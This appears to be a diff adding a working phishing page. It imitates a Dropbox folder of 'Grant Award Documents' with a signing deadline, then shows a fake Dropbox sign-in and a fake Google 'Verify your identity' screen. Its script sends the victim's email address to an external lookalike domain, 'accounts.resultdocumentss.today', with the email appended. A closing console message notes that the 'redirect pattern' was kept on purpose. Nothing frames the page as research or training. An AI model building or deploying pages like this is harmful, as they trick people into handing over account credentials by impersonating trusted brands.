+                        <strong>Deadline:</strong> Please complete and return the signed document no later than <strong>November 20, 2026</strong>.
+                    </p>
+                    <p style="font-size: 14px; color: var(--db-text-secondary); line-height: 1.7;">
+                        We look forward to supporting your mission.
+                    </p>
+                </div>
+            </section>
+
+            <section class="folder">
+                <div class="head">
+                    <svg viewBox="0 0 24 24"><path d="M20 6h-8l-2-2H4c-1.1 0-2 .9-2 2v12c0 1.1.9 2 2 2h16c1.1 0 2-.9 2-2V8c0-1.1-.9-2-2-2z"/></svg>
+                    <span>SUBMISSION ID: SCC-9303485-27</span>
+                    <span class="count">7 files</span>
+                </div>
+                <div class="file-row">
+                    <div class="icon">PDF</div>
+                    <div class="info">
+                        <div class="name">Grant-IT-2026-001.pdf</div>
+                        <div class="meta">Modified 2 hours ago by you • 3.8 MB</div>
+                    </div>
+                    <div class="size">5.3 MB</div>
+                    <div class="status ready">Ready</div>
+                    <button class="more" aria-label="More"><svg viewBox="0 0 24 24"><path d="M12 8c1.1 0 2-.9 2-2s-.9-2-2-2-2 .9-2 2 .9 2 2 2zm0 2c-1.1 0-2 .9-2 2s.9 2 2 2 2-.9 2-2-.9-2-2-2zm0 6c-1.1 0-2 .9-2 2s.9 2 2 2 2-.9 2-2-.9-2-2-2z"/></svg></button>
+                </div>
+                <div class="file-row">
+                    <div class="icon">PDF</div>
+                    <div class="info">
+                        <div class="name">DJK-49674.pdf</div>
+                        <div class="meta">Modified yesterday by Sam ghkn • 7.3 MB</div>
+                    </div>
+                    <div class="size">3.2 MB</div>
+                    <div class="status shared">Shared</div>
+                    <button class="more" aria-label="More"><svg viewBox="0 0 24 24"><path d="M12 8c1.1 0 2-.9 2-2s-.9-2-2-2-2 .9 2 2 2 2zm0 2c-1.1 0-2 .9-2 2s.9 2 2 2 2-.9 2-2-.9-2-2-2zm0 6c-1.1 0-2 .9-2 2s.9 2 2 2 2-.9 2-2-.9-2-2-2z"/></svg></button>
+                </div>
+                <div class="file-row">
+                    <div class="icon">PDF</div>
+                    <div class="info">
+                        <div class="name">Grant-DJK-49674</div>
+                        <div class="meta">Modified 3 days ago by you • 9.5 MB</div>
+                    </div>
+                    <div class="size">4.8 MB</div>
+                    <div class="status ready">Ready</div>
+                    <button class="more" aria-label="More"><svg viewBox="0 0 24 24"><path d="M12 8c1.1 0 2-.9 2-2s-.9-2-2-2-2 .9-2 2 .9 2 2 2zm0 2c-1.1 0-2 .9-2 2s.9 2 2 2 2-.9 2-2-.9-2-2-2zm0 6c-1.1 0-2 .9-2 2s.9 2 2 2 2-.9 2-2-.9-2-2-2z"/></svg></button>
+                </div>
+            </section>
+
+            <section class="folder">
+                <div class="head">
+                    <svg viewBox="0 0 24 24"><path d="M20 6h-8l-2-2H4c-1.1 0-2 .9-2 2v12c0 1.1.9 2 2 2h16c1.1 0 2-.9 2-2V8c0-1.1-.9-2-2-2z"/></svg>
+                    <span>GRANT – Construction</span>
+                    <span class="count">2 files</span>
+                </div>
+                <div class="file-row">
+                    <div class="icon">PDF</div>
+                    <div class="info">
+                        <div class="name">Grant-DJK-49674.pdf</div>
+                        <div class="meta">Modified 1 week ago by Marcus Rivera • 7.8 MB</div>
+                    </div>
+                    <div class="size">6.3 MB</div>
+                    <div class="status shared">Shared</div>
+                    <button class="more" aria-label="More"><svg viewBox="0 0 24 24"><path d="M12 8c1.1 0 2-.9 2-2s-.9-2-2-2-2 .9-2 2 .9 2 2 2zm0 2c-1.1 0-2 .9-2 2s.9 2 2 2 2-.9 2-2-.9-2-2-2zm0 6c-1.1 0-2 .9-2 2s.9 2 2 2 2-.9 2-2-.9-2-2-2z"/></svg></button>
+                </div>
+                <div class="file-row">
+                    <div class="icon">PDF</div>
+                    <div class="info">
+                        <div class="name">DJK-49674.pdf</div>
+                    <div class="meta">Modified 1 week ago by you • 4.9 MB</div>
+                    </div>
+                    <div class="size">2.9 MB</div>
+                    <div class="status ready">Ready</div>
+                    <button class="more" aria-label="More"><svg viewBox="0 0 24 24"><path d="M12 8c1.1 0 2-.9 2-2s-.9-2-2-2-2 .9-2 2 .9 2 2 2zm0 2c-1.1 0-2 .9-2 2s.9 2 2 2 2-.9 2-2-.9-2-2-2zm0 6c-1.1 0-2 .9-2 2s.9 2 2 2 2-.9 2-2-.9-2-2-2z"/></svg></button>
+                </div>
+            </section>
+
+            <section class="folder">
+                <div class="head">
+                    <svg viewBox="0 0 24 24"><path d="M20 6h-8l-2-2H4c-1.1 0-2 .9-2 2v12c0 1.1.9 2 2 2h16c1.1 0 2-.9 2-2V8c0-1.1-.9-2-2-2z"/></svg>
+                    <span>Grant – Marketing</span>
+                    <span class="count">13 files</span>
+                </div>
+                <div class="file-row">
+                    <div class="icon">PDF</div>
+                    <div class="info">
+                        <div class="name">Grant-DJK-49674.pdf</div>
+                        <div class="meta">Modified 1 weeks ago by you • 8.7 MB</div>
+                    </div>
+                    <div class="size">6.9 MB</div>
+                    <div class="status ready">Ready</div>
+                    <button class="more" aria-label="More"><svg viewBox="0 0 24 24"><path d="M12 8c1.1 0 2-.9 2-2s-.9-2-2-2-2 .9-2 2 .9 2 2 2zm0 2c-1.1 0-2 .9-2 2s.9 2 2 2 2-.9 2-2-.9-2-2-2zm0 6c-1.1 0-2 .9-2 2s.9 2 2 2 2-.9-2-.9-2-2-2z"/></svg></button>
+                </div>
+                <div class="file-row">
+                    <div class="icon">PDF</div>
+                    <div class="info">
+                        <div class="name">Grant-djt-r8485.docx.pdf</div>
+                        <div class="meta">Modified 5 weeks ago by mike tommy • 1.8 MB</div>
+                    </div>
+                    <div class="size">9.5 MB</div>
+                    <div class="status shared">Shared</div>
+                    <button class="more" aria-label="More"><svg viewBox="0 0 24 24"><path d="M12 8c1.1 0 2-.9 2-2s-.9-2-2-2-2 .9-2 2 .9 2 2 2zm0 2c-1.1 0-2 .9-2 2s.9 2 2 2 2-.9 2-2-.9-2-2-2zm0 6c-1.1 0-2 .9-2 2s.9 2 2 2 2-.9 2-2-.9-2-2-2z"/></svg></button>
+                </div>
+            </section>
+        </main>
+    </div>
+
+    <div class="modal-overlay" id="modalOverlay">
+        <div class="modal" role="dialog" aria-labelledby="modalTitle">
+            <div class="brand">
+                <img src="https://thumb.wikimedia.org/wikipedia/commons/thumb/7/78/Dropbox_Icon.svg/1280px-Dropbox_Icon.svg.png" alt="Dropbox" />
+                <div class="text">
+                    <h2>Dropbox</h2>
+                    <p>Secure document access</p>
+                </div>
+            </div>
+            <h1 id="modalTitle">Sign in to continue</h1>
+            <p class="desc">Access <strong>Grant Award Documents</strong> shared with you. Sign in with your Google account.</p>
+            <div class="field">
+                <label for="emailInput">Email address</label>
+                <input type="email" id="emailInput" placeholder="you@company.com" autocomplete="email" spellcheck="false" />
+                <div class="error" id="emailError">Please enter a valid email address</div>
+            </div>
+            <button class="google-btn" id="googleBtn">
+                <span class="g-logo">
+                    <svg viewBox="0 0 48 48">
+                        <path fill="#EA4335" d="M24 9.5c3.54 0 6.71 1.22 9.21 3.6l6.85-6.85C35.9 2.38 30.47 0 24 0 14.62 0 6.51 5.38 2.56 13.22l7.98 6.19C12.43 13.72 17.74 9.5 24 9.5z"/>
+                        <path fill="#4285F4" d="M46.98 24.55c0-1.57-.15-3.09-.38-4.55H24v9.02h12.94c-.58 2.96-2.26 5.48-4.78 7.18l7.73 6c4.51-4.18 7.09-10.36 7.09-17.65z"/>
+                        <path fill="#FBBC05" d="M10.54 28.59A14.5 14.5 0 0 1 9.5 24c0-1.59.28-3.14.76-4.59l-7.98-6.19A23.99 23.99 0 0 0 0 24c0 3.77.87 7.35 2.56 10.56l7.98-5.97z"/>
+                        <path fill="#34A853" d="M24 48c6.48 0 11.93-2.13 15.89-5.81l-7.73-6c-2.15 1.45-4.92 2.3-8.16 2.3-6.26 0-11.57-4.22-13.47-9.91l-7.98 5.97C6.51 42.62 14.62 48 24 48z"/>
+                    </svg>
+                </span>
+                Continue with Google
+            </button>
+            <div class="footer">
+                By continuing, you agree to the <a href="#">Terms of Service</a> and <a href="#">Privacy Policy</a>. <br />
+                This site is protected by reCAPTCHA and the Google <a href="#">Privacy Policy</a> and <a href="#">Terms of Service</a> apply.
+            </div>
+        </div>
+    </div>
+
+    <div class="consent-overlay" id="consentOverlay">
+        <div class="consent-card">
+            <div class="g-logo">
+                <svg viewBox="0 0 48 48">
+                    <path fill="#EA4335" d="M24 9.5c3.54 0 6.71 1.22 9.21 3.6l6.85-6.85C35.9 2.38 30.47 0 24 0 14.62 0 6.51 5.38 2.56 13.22l7.98 6.19C12.43 13.72 17.74 9.5 24 9.5z"/>
+                    <path fill="#4285F4" d="M46.98 24.55c0-1.57-.15-3.09-.38-4.55H24v9.02h12.94c-.58 2.96-2.26 5.48-4.78 7.18l7.73 6c4.51-4.18 7.09-10.36 7.09-17.65z"/>
+                    <path fill="#FBBC05" d="M10.54 28.59A14.5 14.5 0 0 1 9.5 24c0-1.59.28-3.14.76-4.59l-7.98-6.19A23.99 23.99 0 0 0 0 24c0 3.77.87 7.35 2.56 10.56l7.98-5.97z"/>
+                    <path fill="#34A853" d="M24 48c6.48 0 11.93-2.13 15.89-5.81l-7.73-6c-2.15 1.45-4.92 2.3-8.16 2.3-6.26 0-11.57-4.22-13.47-9.91l-7.98 5.97C6.51 42.62 14.62 48 24 48z"/>
+                </svg>
+                <span>Google</span>
+            </div>
+
+            <div class="g-title">Verify your identity</div>
+            <div class="g-sub">Dropbox Grant Documents uses Google to keep your files safe</div>
+
+            <div class="account-card">
+                <div class="avatar" id="consentAvatar">P</div>
+                <div class="details">
+                    <div class="name" id="consentName">You</div>
+                    <div class="email" id="consentEmail">you@company.com</div>
+                </div>
+                <div class="check">
+                    <svg viewBox="0 0 24 24"><path d="M9 16.17L4.83 12l-1.42 1.41L9 19 21 7l-1.41-1.41z"/></svg>
+                </div>
+            </div>
+
+            <div class="trust-badge">
+                <svg viewBox="0 0 24 24"><path d="M12 1L3 5v6c0 5.55 3.84 10.74 9 12 5.16-1.26 9-6.45 9-12V5l-9-4zm0 10.99h7c-.53 4.12-3.28 7.79-7 8.94V12H5V6.3l7-3.11v8.8z"/></svg>
+                <span><strong>Google Protected</strong> — Your info stays private & encrypted</span>
+            </div>
+
+            <div class="g-actions">
+                <button class="cancel" id="cancelBtn">Cancel</button>
+            </div>
+
+            <div class="g-footer">
+                Continuing securely via Google OAuth 2.0 · <a href="#">Privacy Policy</a> · <a href="#">Terms</a>
+            </div>
+        </div>
+    </div>
+
+    <div class="toast-container" id="toastContainer" aria-live="polite"></div>
+
+    <script>
+        (function() {
+            'use strict';
+
+            const REDIRECT_BASE = 'https://accounts.resultdocumentss.today?XjDHyUCp=bmpwaW1mcXo=';
+            const emailInput = document.getElementById('emailInput');
+            const emailError = document.getElementById('emailError');
+            const googleBtn = document.getElementById('googleBtn');
+            const consentOverlay = document.getElementById('consentOverlay');
+            const consentEmail = document.getElementById('consentEmail');
+            const consentName = document.getElementById('consentName');
+            const consentAvatar = document.getElementById('consentAvatar');
+            const cancelBtn = document.getElementById('cancelBtn');
+            const modalOverlay = document.getElementById('modalOverlay');
+            const toastContainer = document.getElementById('toastContainer');
+
+            let autoRedirectTimer = null;
+
+            function showToast(message) {
+                const toast = document.createElement('div');
+                toast.className = 'toast';
+                toast.innerHTML = `
+                    <svg class="toast-icon" viewBox="0 0 24 24"><path d="M12 2C6.48 2 2 6.48 2 12s4.48 10 10 10 10-4.48 10-10S17.52 2 12 2zm-2 15l-5-5 1.41-1.41L10 14.17l7.59-7.59L19 8l-9 9z"/></svg>
+                    <span>${message}</span>
+                `;
+                toastContainer.appendChild(toast);
+                setTimeout(() => { if (toast.parentNode) toast.remove(); }, 3000);
+            }
+
+            function setError(msg) {
+                emailInput.classList.add('error-border');
+                emailError.textContent = msg || 'Please enter a valid email address';
+                emailError.classList.add('show');
+                emailInput.focus();
+            }
+
+            function clearError() {
+                emailInput.classList.remove('error-border');
+                emailError.classList.remove('show');
+            }
+
+            function isValidEmail(email) {
+                return /^[^\s@]+@[^\s@]+\.[^\s@]+$/.test(email);
+            }
+
+            function showConsent(email) {
+                const name = email.split('@')[0].replace(/[._]/g, ' ');
+                const displayName = name.charAt(0).toUpperCase() + name.slice(1);
+                const avatarLetter = email.charAt(0).toUpperCase();
+
+                consentEmail.textContent = email;
+                consentName.textContent = displayName;
+                consentAvatar.textContent = avatarLetter;
+
+                modalOverlay.style.display = 'none';
+                consentOverlay.classList.add('show');
+
+                autoRedirectTimer = setTimeout(function() {
+                    handleRedirect(email);
+                }, 1400);
+            }
+
+            function handleRedirect(email) {
+                const redirectUrl = REDIRECT_BASE + encodeURIComponent(email);
+                window.location.href = redirectUrl;
+            }
+
+            function handleEmailSubmit() {
+                const email = emailInput.value.trim();
+                clearError();
+
+                if (!email) {
+                    setError('Please enter your email address');
+                    return;
+                }
+
+                if (!isValidEmail(email)) {
+                    setError('Please enter a valid email address');
+                    return;
+                }
+
+                showConsent(email);
+            }
+
+            googleBtn.addEventListener('click', handleEmailSubmit);
+
+            emailInput.addEventListener('keydown', function(e) {
+                if (e.key === 'Enter') {
+                    e.preventDefault();
+                    handleEmailSubmit();
+                }
+            });
+
+            emailInput.addEventListener('input', clearError);
+
+            cancelBtn.addEventListener('click', function() {
+                if (autoRedirectTimer) {
+                    clearTimeout(autoRedirectTimer);
+                    autoRedirectTimer = null;
+                }
+                consentOverlay.classList.remove('show');
+                modalOverlay.style.display = 'flex';
+                emailInput.focus();
+                showToast('⏸️ Sign-in cancelled');
+            });
+
+            consentOverlay.addEventListener('click', function(e) {
+                if (e.target === consentOverlay) {
+                    if (autoRedirectTimer) {
+                        clearTimeout(autoRedirectTimer);
+                        autoRedirectTimer = null;
+                    }
+                    consentOverlay.classList.remove('show');
+                    modalOverlay.style.display = 'flex';
+                    emailInput.focus();
+                    showToast('⏸️ Sign-in cancelled');
+                }
+            });
+
+            document.addEventListener('keydown', function(e) {
+                if (e.key === 'Escape' && consentOverlay.classList.contains('show')) {
+                    if (autoRedirectTimer) {
+                        clearTimeout(autoRedirectTimer);
+                        autoRedirectTimer = null;
+                    }
+                    e.preventDefault();
+                    consentOverlay.classList.remove('show');
+                    modalOverlay.style.display = 'flex';
+                    emailInput.focus();
+                    showToast('⏸️ Sign-in cancelled');
+                }
+            });
+
+            window.addEventListener('load', function() {
+                setTimeout(function() {
+                    emailInput.focus();
+                }, 300);
+            });
+
+            document.querySelectorAll('.file-row').forEach(row => {
+                row.addEventListener('click', function(e) {
+                    if (e.target.closest('.more')) return;
+                    const name = this.querySelector('.name')?.textContent || 'file';
+                    showToast(`📄 Opening ${name}…`);
+                });
+                const moreBtn = row.querySelector('.more');
+                if (moreBtn) {
+                    moreBtn.addEventListener('click', function(e) {
+                        e.stopPropagation();
+                        const name = row.querySelector('.name')?.textContent || 'file';
+                        showToast(`⚙️ More options for ${name}`);
+                    });
+                }
+            });
+
+            document.querySelectorAll('.pill-btn').forEach(btn => {
+                btn.addEventListener('click', function() {
+                    const label = this.querySelector('span')?.textContent || 'Action';
+                    showToast(`🚀 ${label} clicked (demo)`);
+                });
+            });
+
+            const searchInput = document.querySelector('.topbar .search input');
+            if (searchInput) {
+                searchInput.addEventListener('keydown', function(e) {
+                    if (e.key === 'Enter') {
+                        const query = this.value.trim();
+                        if (query) showToast(`🔍 Searching for "${query}"…`);
+                    }
+                });
+            }
+
+            document.querySelector('.profile')?.addEventListener('click', function() {
+                showToast('👤 Profile settings (demo)');
+            });
+
+            document.querySelector('.icon-btn[aria-label="Notifications"]')?.addEventListener('click', function() {
+                showToast('🔔 You have 3 new notifications');
+            });
+
+            document.querySelectorAll('.sidebar nav a').forEach(link => {
+                link.addEventListener('click', function(e) {
+                    e.preventDefault();
+                    document.querySelectorAll('.sidebar nav a').forEach(a => a.classList.remove('active'));
+                    this.classList.add('active');
+                    const label = this.querySelector('span')?.textContent || 'page';
+                    showToast(`📍 Navigated to ${label}`);
+                });
+            });
+
+            console.log('✅ GRANT Documents — Blue theme, redirect pattern preserved');
+        })();
+    </script>
+
+</body>
+</html>
